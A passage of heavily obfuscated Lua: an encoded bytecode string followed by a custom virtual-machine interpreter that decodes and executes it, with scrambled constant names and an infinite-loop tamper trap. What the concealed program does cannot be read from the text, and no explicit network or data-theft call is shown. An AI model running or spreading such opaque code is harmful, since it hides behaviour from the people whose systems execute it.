UF*Cpnp.nXKKK.OR}}x7xRC}X*Xc2xRpcncCFnF00Xp2..3c*Op7pRn}K*KcO.}pxhxCCKC0XX2K2.cXcOFKFR0x.*.cWx*pp}pCn}n0KROK}*}2xOX}CRXC2*2cRxcOcFFC.R00.XJK*y*2pOnYnFK}O*Oc}xxOxFCCXn2*RXRKR.c2Fnx}XK21RFcK2F00cp...Oo0pO.C 2nnCCXLXR2}R*R.FCFpFF0C.*Xxc*cRFx0.0X..R0p<*Onp02nFKOOFORR}RXcKc.%S.}.7.RA}*}*cpCnpn.KCOx.R}XxKx.C.XO2*2RcCF2ccFC0p00.ConL0*XKnp.nRKOOpOR}}x*CdpKXpXF2CR2R0c2FK.*}O.O7*WR*Xp*pcnxKp}cOC}K}0xRCKC.X22O.CRRc}F*FF0x.p.FrX*n*0pXnKKxK2OO}(}0x}C*CcXx2n2FRCcnc0FX0KF.nXV}*B*Rp}n*ncKxKp*c}Xxnx0CXXKX.220O>EccF}0*0c.xfpqF*C}nn*nFKKK.O2}nn}KnnRXpXc2xRpRFcCFnK0pX.O..v2*Op%pRn}K*KcXC}p}FxCCn2XXX2X2.R2cOF_FR0}pn.c9c*ppppCnnn0K.}OO.}.xOCxCRXx2*2cRxc}}2FC0n00#kgK*z*2pOKRnRKRO*Oc}xxpxFCCX}X020RKcKc2FO0o0R*Oi****xpKpFnCKnK0xK}KxKx2C}X3XR2}R*0xcxFnFF0F.n..zXp}p0p2n2K)OnO}}*}cCXC.CFX02nRHRXcKc.0c.R.&qp)}*K*cpxnpnFKXOn}}}XxOx.C2XO2LcpR}cXccF.0p.*.C*O*O*XpFp.KpKOOeORxC0cxcX*XpX02CRnR0cX.OF..O.O,OQR*Cp*OpKCKpOCOCxF}0x2CKXxX22XKFRRc}F*.}0x.n.F+Cp0*0nOnKK*K2OO}9CR.CC*XXXx2n2FR0cnc0.n0K.0.2wR*m*Rp}n*OpKx}pOF}0xnx0CXXKR}22cpcSFRF}0n0c.x*0=FpKpnn2nXO*K.x2x}xlCKC}XFXc2RRp0n02Fn0X0X**..AR*OpppRn2F0KcOx}pC2xCCKC0XFK*2.R2cO.KFR0x.*.cpp*ppXpCnOn0KXOKx..+xOCFCRXx2*RpRxcpFZFC.p00..?Kr.*2pOncnRO}O*}p}xxpxFCCXxX0R}RKc.c2Fx0_0R.c)**C*xp0pFKOKnK0O0}KxCx2C0Xy2x2}FxF0cxFFFF/..n../X*X*.p0FpK-KRO}CC}cxCCpX*nO2n20RX.Rc.FR0O*anK^}*C*cp0npn.KCOnF*}XCkx.CFXO212RR}cKcc0n0p.K.Cf.f0nXnXp.K}KOOcOR}Cx*xcXRXp222CR}R0cXFK..M*.OD0GR*Xp*npnxKpO.OCxn}0COCKC.X22Oc3RRFxF*0C0x.p.FPCxc*0nxnKO(K2Ox}a}RcCC*XXXx2.2Fc}cnc0000K.c.2g0*zpCp}n*K0Kx}BOFxpxnx0CXXK2O22cKcSc0F}0*0c*x*nNFpCpnnRnXKRK.O2xXxHC2C}2NXcRxRpRFc.Fn0C0Xjp..*X*Op}}.n}KxKcX*}p}0xCCRC0XFK*2.R2cOb2FR0x.*6?2K*p*FpCxWn0K2OKO.COxOCcCRX}2*2cRxcpnpFC0.00.XHK*X*2pOK.nROjO*O0}xxpxF2CccX020RKcKc2Fx0u:Rp.?**p*xpCpFn2KnOp.}}K}.x2XOXSXc2}R*hKcxFpFF0X.n.03X*X*.p2nOKVKcO}}*}cxCCpCFXC2n20RXRK%0F.0O.t.Rp}Kp*cpCnpnFKCOKO0}XCKx.CRXO2*2RRxc*cc0C0p00.Ctn^0*XpKp.KCKOO*OR}xx*xFCxXp2}2CRnR0c2FKF.02.O+/_R*}p*pcnxKpKFO2}n}0xXCKR}X22OR3RRc}F*Fc0xn2.FkC*n*.pXnKn.KROO}i}Rx}COCcXx2p20RCcnc0FX0K0..29O*npCp}n*ncKO<K.Cp2pFnnp0nKO}}p}XOXC}FX0x0c.xjpQRFRFX0p.C%nOuO2}OxixRC}X*Cc0}F*RFcCFnF0p0.K..U2*OpopRn}K*K0Ox}n}FxXCnC0XX2Kc*R2cxFwFF0}.*.cDx*R*FpXnnn.KXO}O.}2x0C,CRX}2n2cRXcpFnFR0n00.X*xM.*RpOn*nRK200Oc}xxpXICCXKX02XRKR.c2FO0L0R.}!**0n5ppp0nCK}K0OX}KxO*pCOXpXR2xR*RFcxFOFF0C}2.0YX*Kppp2nOKZKRcF}*}cxxCnCFXC2n20n)cKc.F20x.b.Ro}**p*pxnnnFK2OnO0}XxKccC2XO2/2RR}cpcc.x}p0F.CNnU0*XpCp.KuF0OUOR}}CKxcCCXpX02CRxORcXFKF..F.O)*#R*2R0pcnxKp}ROC}K}0CR..C.X22OR*RRc}F*Fc.n.p.F^C*x*0pXnKn.}pOO}:}RxRC*CcXx2pRFRCcKc0F.0K0..2kOp**Rp}n*n0KxOnOFx2xxx0CXXK2*22ROcwcR0p0*0c.x)nAF*Xpnp0OnKKK.O2}}xUxRC}X*0O2xRpRFcCFnF00X.}xnh2*}p(pRn}K*KcOxm*}FxXCnC.XX2O2.R2^FFUFR0}.p.c9x*p*Fp2nnn0KXOOO.}2xOC*CRX}2*2cRxcpRF*x0C00.X5Kp.KRpOn*nRK}O*OF}xxpC2CCXKX022RKc_c2FO0C0R.x6*)c*xpppFnC}TK0O2}KxZx2C}XiXR2RR*RccxFnFF0C.n.04X*K*.p2nOK+KRO}}C}cxxCpCF0X2n20RXcKc.F20O.oaFm}*p*cpCnpnFKCOn}K}Xx}x.CcXO2/2RR}F=ccFC0p00.CqOG0*Xn2p.n2KOO*OR}}x*xcX.XpXF2CRnR0cXFKF.>G.ONaGR*xp*pcnxKpKFOC}n}0C*CKC.X22}RTRRc}F*Fc0x.pnFtR*X*0pXnKnF**sX*Op2p0CKXpXx2p2FR}C}CKCF2n20.F*/*)*Rp}p.00.X*X*.p0n2KnKOOOOX2RROc_cRF}0*0c0xK**4*Fpnp0nXKp*}p}pCpCx0XnX*Xc2xRWCnCuX2X02*RRRnF*cXFO0200KKOnOx}p}Fx}KXOOO0}6x-xK*RFsFR0}hnO2tx*K*FpRnnn0KXOK}<}2xCCACRX}2*2cRxFVcFFc0n0..X_K).*2npnAn0K}OKOc}RxpxFXnXn2p2XRKR.c2FO0_...} O_c*RpppFnCKnOOOX}X}.x2COX-XR2}*2RccXFp0p0C.O.0_.KK*.pcnOKcKROx}*}cxxC}p2XC2n20cOcKF3F20OOn.R+X***FpxnpnFKCxpO0}cxKC*C2XO2zRFc.c*c.Fx0C0F.CMn>0O}pKnnn2K}O(OR}}x*2*CxXOXF22Rnc6cX.2w*02.CIH*F*}pppcn.KpO*.O}n}0xXX}C.XR2ORKOCc}F*Fc*}.p.0MC*nnXpXnxn.K2OO}M}Rx}CKCcX22pR4RCcKc0F.xF0..FSOpC*Rpxn*nFKxO}.2}Cxnx02*XK2^22ROpncRFX0*0c.xtpHF*CKpp0ncKKO*O2}OxHxR2*X*X.2xRpRFcCFnF00c.KrpT2*Cp7pcn}K*2.Ox}}}FxCCnC0XX2Kc2R2c2FIFR0}.*.cBF22*Fp0nnK*KXOOO.}RxOCycCX}2*2cRRcpcFFC0nOn.X,Xk.*RpOn}nROC}2Oc}cxpCKCCXnX02XRKR.F=FO0(0R.}?*_c*xppnKnCKnK0O2}KxO*pCOXCXR2}R*RFcxFnFF0CnY.0WX*Kpnp2nOKWORx}}*xnxxC}CF282n20c0cKFKF20c./.F9}pnp*pxnCnFKROnO0}XxKC0C2Xc2Z2RR}c*ccFx.X0F..!n*O*XpKp.n2OXOj}n}}x}xcCxXpXF22RncKcXFcF.0R.Oo/p}*}pxpcnxKpKFOC}nFnxXC2C.XR2ORnRRc}.uFc0R.p..+C*n*0pXnRn.KFOO}D}Rx}C*X0Ro2pR>RCcXc0FX0K0.nxAO*K*Rpxn*ncKxOpCp}Cx}x0CRXK2*22FR0pcRFX0*p*.x9n8F*2pnnpF}KKK.O2X2xExcC}XOnX2xRpRF*FFnF.0X.K*2h2*CpmpRn}K*KcxxRp}FxcCnC.XX2X2.R2FxFLF00}.K.cmR*pnFp2nnKpKXOOO.}RxOCZC0X}2K2cR2cpF*FC0nU}.X8Cy.*2pOn!nRK}O}Oc}cxpxFCCXnX0cXcxR.FVFO0*0R.R:*oc*2ppnpnCKCK0O.}KC..2COX}XR2xR*RFcxFCxO0C.2.0b2*Kp%p2n}K7KRXn}*}cxxC}CFXC2n20*0cKFKF20R.lkp<}pnnOpxnxnFK.OnO0}XxKx.C2XR2%2RR}c*ccFx0p0F..ZnI0*XpOp.K(FFOh}n}}xnxcCCXpX02CRn.RcXFKF.00.O<Z=Rp}K*pcn0KpO*OC}R}0xXC.C.X.2ORxRRcCF*00.!.p7n,C*}*0pXnKn.K.OO}x}Rx}C*CcXx2pcORCc2c0040K0..2SOpC*Rp0n*K*KxOpOF}CCOx0C.XK2x22R}c^cR.*0*.p.x!pjF*CpnK00pKKO}O2}}xmC7C}X*2n2xRCRFc0Fn0O0X*K*}-2*cp4pcn}KpKcOxxc}Fx0CnXOXX2x2.R2c.FWF.0}.n.cfx*p*FpFnnK*KXOKO.}2xOC3FnX}2*2cRCcpcFFC0O.p.XWK .*2pOnSnRKXO*Oc}xxp0jCCXnX022RKR.c2FOGx0R.}%*;c*xpppFnCCRK0OX}KxIx2COX;XR2}R*RccxFpFF0C.nVpMX*K*.p2XCKfKcO}}p}cxxCpCFR.2n2.RXcKc.F20O.QKn<}***cpCnpnFKCOn2}}XxKx.CRXO2E2RRxc*ccFx0p0F.CqnS0*cpKp.n2KORnOR}}x*xFCxXpXF2CF2R0cXFKF.02.O^+^RO0p*pcnxKnKFOC}n}0xXCKC.X22OR3RRc}FOFc0x.p.F}R*n*.pXnOn.K2OO}oXpx}CpCcXx2p2FRCcn*}FX0K0..R_O*4*Rp}xXncKxOpO0}Cxnx0C2XKX.22ROc*cRF}0*0F.xupTF*Cpnp0pXCnOKO2}OxwXRRxX*XF2xRpRFcXFnF0.2.Kz1a2*}popcn}K*}OOx}n}FxCCnC0XX2KcpR2c}FTFc0}.p.cExpF*FpCnnn.KXOKO.}2xOCACRX}2p2cRxcpc0FC0n00.X6K).V2}KnOnRK}O*xcXCxpx0CCXnX022RKR.FRFO0*0R.xV*5F*xppnKnCKKK0OX}K}.x2COXCXR2xR*RFcxFnFF0C.F.07X*Kp^p2nOKLKRO}}*}cxx");local n=c.QrRGXQeQ;c.sQaAjVKO(function()c.tUxRaKcs()n=n+c.JCyyofth end)local function e(d,e)if e then return n end;n=d+n;end local d,n,a=f(c.QrRGXQeQ,f,e,o,c.glUzgyWM);local function p()local d,n=c.glUzgyWM(o,e(c.JCyyofth,c.tYBlgiIf),e(c.IQduFFqs,c.cHZTGjBI)+c.jppjJjCT);e(c.jppjJjCT);return(n*c.OZWHDWDt)+d;end;local le=true;local u=c.QrRGXQeQ local function k()local e=n();local n=n();local l=c.JCyyofth;local t=(d(n,c.JCyyofth,c._HQYnEip)*(c.jppjJjCT^c.qXhDqKYR))+e;local e=d(n,c.SoquatxZ,c.DvOYPZin);local n=((-c.JCyyofth)^d(n,c.qXhDqKYR));if(e==c.QrRGXQeQ)then if(t==u)then return n*c.QrRGXQeQ;else e=c.JCyyofth;l=c.QrRGXQeQ;end;elseif(e==c.ystIVcSp)then return(t==c.QrRGXQeQ)and(n*(c.JCyyofth/c.QrRGXQeQ))or(n*(c.QrRGXQeQ/c.QrRGXQeQ));end;return c.jLcytGaA(n,e-c._eEAAQry)*(l+(t/(c.jppjJjCT^c.FLZrPEoM)));end;local b=n;local function g(n)local d;if(not n)then n=b();if(n==c.QrRGXQeQ)then return'';end;end;d=c.OwwJiYuf(o,e(c.JCyyofth,c.tYBlgiIf),e(c.IQduFFqs,c.cHZTGjBI)+n-c.JCyyofth);e(n)local e=""for n=(c.JCyyofth+u),#d do e=e..c.OwwJiYuf(d,n,n)end return e;end;local b=#c.dtDUIzZc(s('\49.\48'))~=c.JCyyofth local e=n;local function de(...)return{...},c.TuJKPsiC('#',...)end local function te()local o={};local e={};local u={};local s={o,u,nil,e};local e=n()local f={}for t=c.JCyyofth,e do local d=a();local e;if(d==c.jppjJjCT)then e=(a()~=#{});elseif(d==c.JCyyofth)then local n=k();if b and c.KBAKdkEE(c.dtDUIzZc(n),'.(\48+)$')then n=c.CJuWmVCH(n);end e=n;elseif(d==c.tYBlgiIf)then e=g();end;f[t]=e;end;for s=c.JCyyofth,n()do local e=a();if(d(e,c.JCyyofth,c.JCyyofth)==c.QrRGXQeQ)then local h=d(e,c.jppjJjCT,c.tYBlgiIf);local a=d(e,c.nTcDfHCQ,c.cHZTGjBI);local e={p(),p(),nil,nil};if(h==c.QrRGXQeQ)then e[l]=p();e[r]=p();elseif(h==#{c.JCyyofth})then e[l]=n();elseif(h==_[c.jppjJjCT])then e[l]=n()-(c.jppjJjCT^c.lSVBkYEk)elseif(h==_[c.tYBlgiIf])then e[l]=n()-(c.jppjJjCT^c.lSVBkYEk)e[r]=p();end;if(d(a,c.JCyyofth,c.JCyyofth)==c.JCyyofth)then e[t]=f[e[t]]end if(d(a,c.jppjJjCT,c.jppjJjCT)==c.JCyyofth)then e[l]=f[e[l]]end if(d(a,c.tYBlgiIf,c.tYBlgiIf)==c.JCyyofth)then e[r]=f[e[r]]end o[s]=e;end end;s[c.tYBlgiIf]=a();for e=c.JCyyofth,n()do u[e-(#{c.JCyyofth})]=te();end;return s;end;local function ne(d,e,n)local t=e;local t=n;return s(c.KBAKdkEE(c.KBAKdkEE(({c.sQaAjVKO(d)})[c.jppjJjCT],e),n))end local function b(z,o,a)local function te(...)local p,y,_,ne,k,n,s,g,j,ee,u,d;local e=c.QrRGXQeQ;while-c.JCyyofth<e do if e<c.tYBlgiIf then if e>=c.JCyyofth then if e~=-c.jppjJjCT then for d=c.BeZqBXgF,c.lBQXcydR do if c.JCyyofth<e then n=-c.VIOOxITr;s=-c.JCyyofth;break;end;_=f(c.cHZTGjBI,c.kOPBqpbr,c.tYBlgiIf,c.OgJLIAZv,z);k=de ne=c.QrRGXQeQ;break;end;else _=f(c.cHZTGjBI,c.kOPBqpbr,c.tYBlgiIf,c.OgJLIAZv,z);k=de ne=c.QrRGXQeQ;end else p=f(c.cHZTGjBI,c.dmTfCHmn,c.JCyyofth,c.DvOYPZin,z);y=f(c.cHZTGjBI,c.xgIiCduR,c.jppjJjCT,c.cHZTGjBI,z);end else if c.nTcDfHCQ<e then if e>c.jppjJjCT then repeat if c.cHZTGjBI~=e then d=f(c.HunOPD_T);break;end;e=-c.jppjJjCT;until true;else d=f(c.HunOPD_T);end else if e>-c.JCyyofth then repeat if e<c.nTcDfHCQ then g={};j={...};break;end;ee=c.TuJKPsiC('#',...)-c.JCyyofth;u={};until true;else g={};j={...};end end end e=e+c.JCyyofth;end;for e=c.QrRGXQeQ,ee do if(e>=_)then g[e-_]=j[e+c.JCyyofth];else d[e]=j[e+c.JCyyofth];end;end;local z=ee-_+c.JCyyofth local e;local f;function _HogbRMdeaFh()le=false;end;local function _(...)while true do end end while le do if n<-c.CYPBOGhp then n=n+c.KhYkYXSo end e=p[n];f=e[m];if f<=c.LzyErxPy then if c.KhYkYXSo>f then if c._HQYnEip>=f then if c.dsWaetem>=f then if c.nTcDfHCQ>=f then if f<c.jppjJjCT then if f>c.QrRGXQeQ then d[e[t]][d[e[l]]]=d[e[r]];else d[e[t]]={};end else if f<=c.jppjJjCT then d[e[t]]=d[e[l]]-e[r];else if-c.JCyyofth<f then for n=c.bueuZ_Zm,c.GGBgKKVR do if f~=3 then d[e[t]]();break;end;d[e[t]]=d[e[l]][d[e[r]]];break;end;else d[e[t]]=d[e[l]][d[e[r]]];end end end else if f<=6 then if f>=2 then repeat if f~=5 then local n=e[t]d[n](h(d,n+1,e[l]))break;end;local e=e[t]local t,n=k(d[e](d[e+1]))s=n+e-1 local n=0;for e=e,s do n=n+1;d[e]=t[n];end;until true;else local n=e[t]d[n](h(d,n+1,e[l]))end else if 7<f then if f>8 then local n=e[t];do return d[n](h(d,n+1,e[l]))end;else local p=d[e[r]];if not p then n=n+1;else d[e[t]]=p;n=e[l];end;end else local p=e[t];local l={};for e=1,#u do local e=u[e];for n=0,#e do local e=e[n];local t=e[1];local n=e[2];if t==d and n>=p then l[n]=t[n];e[1]=l;end;end;end;end end end else if 15>f then if f>=12 then if f<13 then local f;o[e[l]]=d[e[t]];n=n+1;e=p[n];d[e[t]]=o[e[l]];n=n+1;e=p[n];d[e[t]]=o[e[l]];n=n+1;e=p[n];f=e[t]d[f](d[f+1])n=n+1;e=p[n];d[e[t]]=a[e[l]];n=n+1;e=p[n];d[e[t]]();n=n+1;e=p[n];do return end;else if f~=10 then repeat if 13<f then local f,c,a;for h=0,4 do if 2<=h then if 2<h then if-1~=h then for r=22,72 do if h~=3 then f=e[t];c=d[f]a=d[f+2];if(a>0)then if(c>d[f+1])then n=e[l];else d[f+3]=c;end elseif(c<d[f+1])then n=e[l];else d[f+3]=c;end break;end;d(e[t],e[l]);n=n+1;e=p[n];break;end;else f=e[t];c=d[f]a=d[f+2];if(a>0)then if(c>d[f+1])then n=e[l];else d[f+3]=c;end elseif(c<d[f+1])then n=e[l];else d[f+3]=c;end end else d[e[t]]=#d[e[l]];n=n+1;e=p[n];end else if h>-3 then repeat if h~=1 then d[e[t]]=d[e[l]][d[e[r]]];n=n+1;e=p[n];break;end;d(e[t],e[l]);n=n+1;e=p[n];until true;else d(e[t],e[l]);n=n+1;e=p[n];end end end break;end;local f;d[e[t]]=d[e[l]];n=n+1;e=p[n];f=e[t]d[f](d[f+1])n=n+1;e=p[n];d[e[t]]=a[e[l]];n=n+1;e=p[n];d[e[t]]();n=n+1;e=p[n];do return end;until true;else local f,c,a;for h=0,4 do if 2<=h then if 2<h then if-1~=h then for r=22,72 do if h~=3 then f=e[t];c=d[f]a=d[f+2];if(a>0)then if(c>d[f+1])then n=e[l];else d[f+3]=c;end elseif(c<d[f+1])then n=e[l];else d[f+3]=c;end break;end;d(e[t],e[l]);n=n+1;e=p[n];break;end;else f=e[t];c=d[f]a=d[f+2];if(a>0)then if(c>d[f+1])then n=e[l];else d[f+3]=c;end elseif(c<d[f+1])then n=e[l];else d[f+3]=c;end end else d[e[t]]=#d[e[l]];n=n+1;e=p[n];end else if h>-3 then repeat if h~=1 then d[e[t]]=d[e[l]][d[e[r]]];n=n+1;e=p[n];break;end;d(e[t],e[l]);n=n+1;e=p[n];until true;else d(e[t],e[l]);n=n+1;e=p[n];end end end end end else if 6<=f then repeat if f~=11 then local f,a;for r=0,2 do if r<=0 then d(e[t],e[l]);n=n+1;e=p[n];else if r~=-1 then repeat if r~=2 then f=e[t]d[f]=d[f](h(d,f+1,e[l]))n=n+1;e=p[n];break;end;f=e[t];a=d[f];for e=f+1,e[l]do c.OszS_ida(a,d[e])end;until true;else f=e[t]d[f]=d[f](h(d,f+1,e[l]))n=n+1;e=p[n];end end end break;end;local c;for f=0,6 do if f>2 then if 4<f then if 5==f then d(e[t],e[l]);n=n+1;e=p[n];else d(e[t],e[l]);end else if f>2 then repeat if f>3 then d(e[t],e[l]);n=n+1;e=p[n];break;end;d[e[t]]=d[e[l]];n=n+1;e=p[n];until true;else d[e[t]]=d[e[l]];n=n+1;e=p[n];end end else if 0<f then if f~=1 then c=e[t]d[c]=d[c](h(d,c+1,e[l]))n=n+1;e=p[n];else d(e[t],e[l]);n=n+1;e=p[n];end else d(e[t],e[l]);n=n+1;e=p[n];end end end until true;else local c;for f=0,6 do if f>2 then if 4<f then if 5==f then d(e[t],e[l]);n=n+1;e=p[n];else d(e[t],e[l]);end else if f>2 then repeat if f>3 then d(e[t],e[l]);n=n+1;e=p[n];break;end;d[e[t]]=d[e[l]];n=n+1;e=p[n];until true;else d[e[t]]=d[e[l]];n=n+1;e=p[n];end end else if 0<f then if f~=1 then c=e[t]d[c]=d[c](h(d,c+1,e[l]))n=n+1;e=p[n];else d(e[t],e[l]);n=n+1;e=p[n];end else d(e[t],e[l]);n=n+1;e=p[n];end end end end end else if 18>f then if f<16 then d[e[t]]=b(y[e[l]],nil,a);else if 13~=f then repeat if f<17 then local e=e[t]d[e]=d[e](h(d,e+1,s))break;end;if(d[e[t]]==e[r])then n=n+1;else n=e[l];end;until true;else if(d[e[t]]==e[r])then n=n+1;else n=e[l];end;end end else if f<=18 then local f,a;for c=0,6 do if 2>=c then if 0>=c then f=e[t];a=d[e[l]];d[f+1]=a;d[f]=a[e[r]];n=n+1;e=p[n];else if 2==c then d[e[t]]=d[e[l]];n=n+1;e=p[n];else d[e[t]]=d[e[l]];n=n+1;e=p[n];end end else if c<=4 then if c>-1 then repeat if c~=3 then d[e[t]][d[e[l]]]=d[e[r]];n=n+1;e=p[n];break;end;f=e[t]d[f]=d[f](h(d,f+1,e[l]))n=n+1;e=p[n];until true;else f=e[t]d[f]=d[f](h(d,f+1,e[l]))n=n+1;e=p[n];end else if 3~=c then for h=22,85 do if c~=6 then f=e[t];a=d[e[l]];d[f+1]=a;d[f]=a[e[r]];n=n+1;e=p[n];break;end;d[e[t]]=d[e[l]];break;end;else d[e[t]]=d[e[l]];end end end end else if f>15 then repeat if 20>f then d[e[t]]=a[e[l]];break;end;local l,r,f;for h=0,1 do if h==0 then l=e[t];s=l+z-1;for e=l,s do r=g[e-l];d[e]=r;end;n=n+1;e=p[n];else l=e[t];f=d[l];for e=l+1,s do c.OszS_ida(f,d[e])end;end end until true;else d[e[t]]=a[e[l]];end end end end end else if 30>=f then if f<=25 then if f<23 then if f>17 then for p=48,77 do if 22~=f then if(d[e[t]]==d[e[r]])then n=n+1;else n=e[l];end;break;end;if(e[t]<d[e[r]])then n=e[l];else n=n+1;end;break;end;else if(d[e[t]]==d[e[r]])then n=n+1;else n=e[l];end;end else if 24>f then d[e[t]]=(e[l]~=0);else if 22~=f then for n=46,69 do if f>24 then d[e[t]]=a[e[l]];break;end;a[e[l]]=d[e[t]];break;end;else d[e[t]]=a[e[l]];end end end else if f<28 then if f>=25 then repeat if 26~=f then d[e[t]]=o[e[l]];break;end;local n=e[t]local t,e=k(d[n](h(d,n+1,e[l])))s=e+n-1 local e=0;for n=n,s do e=e+1;d[n]=t[e];end;until true;else d[e[t]]=o[e[l]];end else if 29>f then local t=e[t];local p=d[t]local f=d[t+2];if(f>0)then if(p>d[t+1])then n=e[l];else d[t+3]=p;end elseif(p<d[t+1])then n=e[l];else d[t+3]=p;end else if f==30 then d[e[t]]=#d[e[l]];else local c;for f=0,6 do if 2<f then if f<=4 then if f>=-1 then for r=20,96 do if f<4 then d(e[t],e[l]);n=n+1;e=p[n];break;end;c=e[t]d[c]=d[c](h(d,c+1,e[l]))n=n+1;e=p[n];break;end;else c=e[t]d[c]=d[c](h(d,c+1,e[l]))n=n+1;e=p[n];end else if 5==f then d[e[t]]=d[e[l]];n=n+1;e=p[n];else d(e[t],e[l]);end end else if f>=1 then if f~=-1 then repeat if f<2 then d(e[t],e[l]);n=n+1;e=p[n];break;end;d(e[t],e[l]);n=n+1;e=p[n];until true;else d(e[t],e[l]);n=n+1;e=p[n];end else d(e[t],e[l]);n=n+1;e=p[n];end end end end end end end else if 36<=f then if f>=39 then if 39>=f then o[e[l]]=d[e[t]];else if 37~=f then repeat if f<41 then local s,k,_,c,u,a,h,f;for f=0,4 do if 1<f then if 2>=f then d[e[t]]=d[e[l]]%e[r];n=n+1;e=p[n];else if 1<=f then for o=27,63 do if 3~=f then f=0;while f>-1 do if f>=3 then if 5<=f then if 4~=f then for e=24,90 do if f~=5 then f=-2;break;end;d[a]=h;break;end;else d[a]=h;end else if 0~=f then for e=11,57 do if f<4 then a=c[s];break;end;h=d[u];for e=1+u,c[_]do h=h..d[e];end;break;end;else a=c[s];end end else if 1>f then s=t;k=l;_=r;else if 0<=f then repeat if 2>f then c=e;break;end;u=c[k];until true;else c=e;end end end f=f+1 end break;end;d[e[t]]=d[e[l]][d[e[r]]];n=n+1;e=p[n];break;end;else f=0;while f>-1 do if f>=3 then if 5<=f then if 4~=f then for e=24,90 do if f~=5 then f=-2;break;end;d[a]=h;break;end;else d[a]=h;end else if 0~=f then for e=11,57 do if f<4 then a=c[s];break;end;h=d[u];for e=1+u,c[_]do h=h..d[e];end;break;end;else a=c[s];end end else if 1>f then s=t;k=l;_=r;else if 0<=f then repeat if 2>f then c=e;break;end;u=c[k];until true;else c=e;end end end f=f+1 end end end else if-1<f then for c=35,86 do if f>0 then d[e[t]]=d[e[l]]+d[e[r]];n=n+1;e=p[n];break;end;d[e[t]]=o[e[l]];n=n+1;e=p[n];break;end;else d[e[t]]=d[e[l]]+d[e[r]];n=n+1;e=p[n];end end end break;end;d[e[t]]=d[e[l]]*e[r];until true;else local u,_,k,c,s,a,h,f;for f=0,4 do if 1<f then if 2>=f then d[e[t]]=d[e[l]]%e[r];n=n+1;e=p[n];else if 1<=f then for o=27,63 do if 3~=f then f=0;while f>-1 do if f>=3 then if 5<=f then if 4~=f then for e=24,90 do if f~=5 then f=-2;break;end;d[a]=h;break;end;else d[a]=h;end else if 0~=f then for e=11,57 do if f<4 then a=c[u];break;end;h=d[s];for e=1+s,c[k]do h=h..d[e];end;break;end;else a=c[u];end end else if 1>f then u=t;_=l;k=r;else if 0<=f then repeat if 2>f then c=e;break;end;s=c[_];until true;else c=e;end end end f=f+1 end break;end;d[e[t]]=d[e[l]][d[e[r]]];n=n+1;e=p[n];break;end;else f=0;while f>-1 do if f>=3 then if 5<=f then if 4~=f then for e=24,90 do if f~=5 then f=-2;break;end;d[a]=h;break;end;else d[a]=h;end else if 0~=f then for e=11,57 do if f<4 then a=c[u];break;end;h=d[s];for e=1+s,c[k]do h=h..d[e];end;break;end;else a=c[u];end end else if 1>f then u=t;_=l;k=r;else if 0<=f then repeat if 2>f then c=e;break;end;s=c[_];until true;else c=e;end end end f=f+1 end end end else if-1<f then for c=35,86 do if f>0 then d[e[t]]=d[e[l]]+d[e[r]];n=n+1;e=p[n];break;end;d[e[t]]=o[e[l]];n=n+1;e=p[n];break;end;else d[e[t]]=d[e[l]]+d[e[r]];n=n+1;e=p[n];end end end end end else if 36>=f then local f;for c=0,6 do if c<=2 then if 0>=c then d[e[t]]=d[e[l]];n=n+1;e=p[n];else if 1==c then d(e[t],e[l]);n=n+1;e=p[n];else d(e[t],e[l]);n=n+1;e=p[n];end end else if 4<c then if 1<=c then repeat if c>5 then f=e[t]d[f]=d[f](h(d,f+1,e[l]))break;end;d(e[t],e[l]);n=n+1;e=p[n];until true;else f=e[t]d[f]=d[f](h(d,f+1,e[l]))end else if c~=2 then repeat if 4~=c then d(e[t],e[l]);n=n+1;e=p[n];break;end;d(e[t],e[l]);n=n+1;e=p[n];until true;else d(e[t],e[l]);n=n+1;e=p[n];end end end end else if 37==f then local e=e[t]d[e]=d[e](d[e+1])else d[e[t]]=d[e[l]]%e[r];end end end else if 33>f then if f>29 then repeat if 32>f then do return d[e[t]]end break;end;local c;for f=0,6 do if 2>=f then if f<=0 then d[e[t]][e[l]]=d[e[r]];n=n+1;e=p[n];else if 1<f then d[e[t]]=a[e[l]];n=n+1;e=p[n];else c=e[t]d[c]=d[c](h(d,c+1,e[l]))n=n+1;e=p[n];end end else if 4>=f then if 4~=f then d[e[t]]=o[e[l]];n=n+1;e=p[n];else d[e[t]]=d[e[l]][d[e[r]]];n=n+1;e=p[n];end else if f>3 then for r=36,72 do if 5~=f then c=e[t]d[c](h(d,c+1,e[l]))break;end;d[e[t]]=d[e[l]];n=n+1;e=p[n];break;end;else d[e[t]]=d[e[l]];n=n+1;e=p[n];end end end end until true;else local f;for c=0,6 do if 2>=c then if c<=0 then d[e[t]][e[l]]=d[e[r]];n=n+1;e=p[n];else if 1<c then d[e[t]]=a[e[l]];n=n+1;e=p[n];else f=e[t]d[f]=d[f](h(d,f+1,e[l]))n=n+1;e=p[n];end end else if 4>=c then if 4~=c then d[e[t]]=o[e[l]];n=n+1;e=p[n];else d[e[t]]=d[e[l]][d[e[r]]];n=n+1;e=p[n];end else if c>3 then for r=36,72 do if 5~=c then f=e[t]d[f](h(d,f+1,e[l]))break;end;d[e[t]]=d[e[l]];n=n+1;e=p[n];break;end;else d[e[t]]=d[e[l]];n=n+1;e=p[n];end end end end end else if 33<f then if 30<f then for p=31,63 do if f~=35 then if(d[e[t]]~=e[r])then n=n+1;else n=e[l];end;break;end;local e=e[t];local n=d[e];for e=e+1,s do c.OszS_ida(n,d[e])end;break;end;else if(d[e[t]]~=e[r])then n=n+1;else n=e[l];end;end else d[e[t]]=d[e[l]]%d[e[r]];end end end end end else if f<=62 then if f>=52 then if f>56 then if f>=60 then if f<61 then for f=0,1 do if-2<f then repeat if 1>f then d[e[t]]=a[e[l]];n=n+1;e=p[n];break;end;if d[e[t]]then n=n+1;else n=e[l];end;until true;else d[e[t]]=a[e[l]];n=n+1;e=p[n];end end else if 57~=f then repeat if 62>f then local p,a,f,h,c,r;local n=0;while n>-1 do if 3>=n then if n>1 then if 0~=n then repeat if 2~=n then h=d;break;end;f=l;until true;else f=l;end else if n>-3 then repeat if n>0 then a=t;break;end;p=e;until true;else p=e;end end else if n>5 then if 2<=n then for e=18,55 do if n<7 then d[r]=c;break;end;n=-2;break;end;else d[r]=c;end else if 3<n then for e=43,62 do if n>4 then r=p[a];break;end;c=h[p[f]];break;end;else c=h[p[f]];end end end n=n+1 end break;end;local e=e[t]d[e]=d[e]()until true;else local e=e[t]d[e]=d[e]()end end else if f>57 then if 56<f then for n=35,67 do if 59~=f then local n=e[t]d[n]=d[n](h(d,n+1,e[l]))break;end;d[e[t]]=d[e[l]]+e[r];break;end;else local n=e[t]d[n]=d[n](h(d,n+1,e[l]))end else 